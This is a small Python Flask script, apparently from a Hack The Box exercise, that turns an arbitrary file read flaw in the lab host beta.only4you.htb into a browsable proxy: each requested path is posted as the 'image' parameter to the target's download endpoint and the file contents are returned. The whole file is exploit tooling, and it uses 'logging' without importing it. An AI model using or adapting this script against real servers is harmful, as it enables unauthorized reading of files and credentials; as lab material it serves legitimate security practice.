from flask import Flask, abort
import os
import requests

app = Flask(__name__)

@app.route('/<path:directory>')
def process_directory(directory):
    # Perform the HTTP request using the given directory
    url = 'http://beta.only4you.htb/download'
    payload = {'image': f'/var/www/only4you.htb/{directory}'}
    response = requests.post(url, data=payload, allow_redirects=False)
    
    # Check if the response contains a 302 status code or a Content-Length of 197
    if response.status_code == 302 or response.headers.get('Content-Length') == '197':
        # Log an error message
        logging.error(f"HTTP request for directory '{directory}' returned a 302 status code or a Content-Length of 197")
        
        # Return a 404 status code
        return "Page not found", 404
    
    # Return the response content as plain text
    return response.text

if __name__ == '__main__':
    app.run()
